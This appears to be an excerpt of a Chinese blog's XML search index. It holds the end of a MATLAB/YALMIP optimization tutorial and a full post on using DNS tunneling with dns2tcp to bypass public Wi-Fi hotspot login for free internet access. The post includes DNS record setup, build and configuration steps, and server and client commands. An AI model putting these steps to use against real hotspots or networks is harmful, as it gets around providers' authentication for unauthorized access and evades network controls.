例如: 1F = [-2 &lt;= x &lt;= 2]; 写目标函数 1obj = x(1)^2+x(2)^2; 求解 1optimize(F,obj[,options]); F为约束,obj为目标函数(默认求最小值),options可选择求解器,改变输出方式,如: 1optimize(F,obj,sdpsettings('solver','gurobi','verbose',2)); 指定solver为Gurobi,不打印解析过程. 获取结果 1opt=value(x); %x的值 具体案例案例一:求 x^2+y^2在x,y∈[-2,2]上的最小值1234567891011%生成2*1的矩阵变量x = sdpvar(2,1);%限制条件F = [-2 &lt;= x &lt;= 2];%目标函数obj = x(1)^2+x(2)^2;%求解optimize(F,obj);%取得值以及对应的x的值optobj = value(obj)optx = value(x) 结果如下(我的gurobi过期了,以下为MATLAB自带求解器结果)12345optobj = 1.5449e-43optx = 1.0e-21 * 0.2779 0.2779 案例二:指派问题,A,B,C为3个员工,P,Q,R为3样工作,成本表如下: A B C P 9 6 2 Q 3 1 4 R 5 6 10 代码:12345678910111213%设x(a,b)==1为a做b工作x=binvar(3,3);%成本矩阵work=[9,6,2;3,1,4;5,6,10];%限制条件,每人只能做一份工作F=[sum(x)==1];%目标函数,总花费最小obj=sum(sum(x.*work));%启动求解器optimize(F,obj);%获取结果optx=value(x)optObj=value(obj) 结果如下:1234567optx = 0 0 1 0 1 0 1 0 0optObj = 8 总结YALMIP让我们用MATLAB语言方便地调用专业的求解器,而借助于MATLAB自带的一些函数,我们可以更容易的解决各种规划问题. 但有一点需要注意,MATLAB的语法虽好用,但也不是所有函数都可以与YALMIP结合,例如神经网络,模拟退火的函数是不可以当做限制函数或限制条件参与规划的.]]></content>
      <categories>
        <category>数学建模</category>
      </categories>
      <tags>
        <tag>规划</tag>
        <tag>约束求解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNS隧道——绕过公共 Wifi 热点登陆免费上网]]></title>
    <url>%2F%E7%BD%91%E7%BB%9C%E5%B1%82-DNS%E9%9A%A7%E9%81%93%E2%80%94%E2%80%94%E7%BB%95%E8%BF%87%E5%85%AC%E5%85%B1-Wifi-%E7%83%AD%E7%82%B9%E7%99%BB%E9%99%86%E5%AE%9E%E7%8E%B0%E5%85%8D%E8%B4%B9%E4%B8%8A%E7%BD%91%2F</url>
    <content type="text"><![CDATA[声明：此方法仅供学习交流，严禁用于非法用途，否则后果自负！！！ 这是一个15年的博文了，因为这两年DNS带外数据的研究比较火，因此将此文从旧的博客搬运来。 DNS隧道实现原理常见的热点都需要登录才能够上网, 而提供热点的ISP对热点的DNS查询服务并不作限制, 这样我们就可以在利用DNS查询机制传递信息. 也就是说, 如果我们的请求数据包中的数据, 不含过滤规则时, 有限制的ISP或者防火墙则不会进行丢包处理. 所以, 我们在发起请求时, 将请求数据包内容通过标准的DNS协议进行加密, 标记解析请求的DNS地址, 则有限制的ISP在解析客户端发起的域名请求时, 无法识别地址, 而去指定的DNS服务器上进行请求查询. 此时, 我们在指定的DNS服务器上进行数据包解密. 再将查询内容返回. 此时, 有限制的ISP或者防火墙会再次检测内容是否为非认证状态, 如果是非认证状态, 则将查询结果内容进行丢包处理. 所以, 在特定的DNS服务器上, 我们需要将结果进行标准DNS协议加密返回客户端. 此时ISP无法识别结果, 而直接返回客户端进行解密处理. 这样我们就完成了一次DNS隧道请求, 而完全绕过的ISP服务商的认证. 建立DNS隧道的环境需求 可以连接有限制的ISP服务商, 比如连接CMCC的无线热点 需要一台拥有公网IP的服务器 DNS隧道工具, 用来提供客户端, 服务器通信加解密操作, 以下总结几个流行的工具: tcp-over-dns http://analogbit.com/software/tcp-over-dns/ dns2tcp http://www.hsc.fr/ressources/outils/dns2tcp/ iodine http://code.kryo.se/iodine/ 客户端代理工具 实战操作本次配置的服务器环境为 CentOS: 123[root@iZ28hcmbsi9Z ~]# cat /etc/issueCentOS release 6.3 (Final)Kernel \r on an \m 为服务器添加A记录和NS记录 a.abc.xyz NS b.abc.xyzb.abc.xyz A 1.2.3.4 (填你的服务器IP, 这里用 1.2.3.4 为例) 配置DNS工具服务端这里我们选用 DNS2TCP 为例在服务器上安装 DNS2TCP 123456wget http://www.hsc.fr/ressources/outils/dns2tcp/download/dns2tcp-0.5.2.tar.gztar zxf dns2tcp-0.5.2.tar.gzcd dns2tcp-0.5.2./configuremakemake install 在 /etc 建立一个名为 dns2tcpd.conf 的文件, 然后输入以下配置: listen = 1.2.3.4（Linux服务器的IP）port = 53user = nobodychroot = /tmpdomain = a.abc.xyz（上面配置NS记录的域名）resources = ssh:127.0.0.1:22,socks:127.0.0.1:1082,http:127.0.0.1:3128 最后的 resources 里面配置的是 dns2tcp 供客户端使用的资源。也就是说，这台服务器允许将22端口（ssh服务），1082端口（socks服务）和3128（http服务）转换成 服务端执行如下命令启动 dns2tcp: 1dns2tcpd -f /etc/dns2tcpd.conf -F -d 2 -f 读取配置文件-F 强制前台运行-d 2 开启debug, 等级为2 到此为止,服务端配置完成 配置DNS工具客户端dns2tcp 的客户端配置较为简单, 一条命令就行: 1dns2tcpc -r ssh -z a.abc.xyz 1.2.3.4 -l 8888 -d 2 -r 后接服务名称, 这里我们用ssh-z 后接NS记录的网址, ip, 注意IP地址最好写上, 可以不写-l 后接本地端口-d 开启 Debug 注意本地需要安装 dns2tcp 工具. 到此为止, 服务端配置完成 可以用SSH测试一下: 1ssh root@127.0.0.1:8888 连通的话就说明 dns2tcp 成功了, 可以直接用SSH通道建立代理上网, 客户端 Chrome 再用 SwitchOmega 接入,也可以在客户端那写 http 或 Socks 服务, 前提是服务器那要有对应服务 (可以找 Kingate 架设 http 和 Socks5 代理 的文章)]]></content>
      <categories>
        <category>网络层安全</category>
      </categories>
      <tags>
        <tag>DNS隧道</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
</search>
